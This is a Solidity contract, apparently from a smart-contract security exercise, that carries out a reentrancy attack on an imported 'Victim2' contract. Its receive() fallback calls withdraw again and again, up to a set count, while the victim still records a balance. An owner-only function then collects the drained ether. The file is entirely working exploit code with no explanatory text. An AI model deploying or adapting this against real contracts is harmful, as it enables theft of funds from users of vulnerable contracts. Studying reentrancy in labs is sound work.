// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Victim2.sol";

contract Attacker2 {
    Victim2 public victim;
    address public owner;

    uint256 public withdrawAmount;
    uint256 public numCalls;
    uint256 public callCount;

    constructor(address _victim) {
        victim = Victim2(_victim);
        owner = msg.sender;
    }

    receive() external payable {
        if (
            callCount < numCalls &&
            address(victim).balance >= withdrawAmount &&
            victim.balances(address(this)) >= withdrawAmount
        ) {
            callCount++;
            victim.withdraw(withdrawAmount);
        }
    }

    function initiateAttack(uint256 _amount, uint256 _calls) external payable {
        require(msg.sender == owner, "Only owner");
        withdrawAmount = _amount;
        numCalls = _calls;
        callCount = 0;

        victim.deposit{value: msg.value}();
        victim.withdraw(_amount);
    }

    function withdrawProfit() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }
}
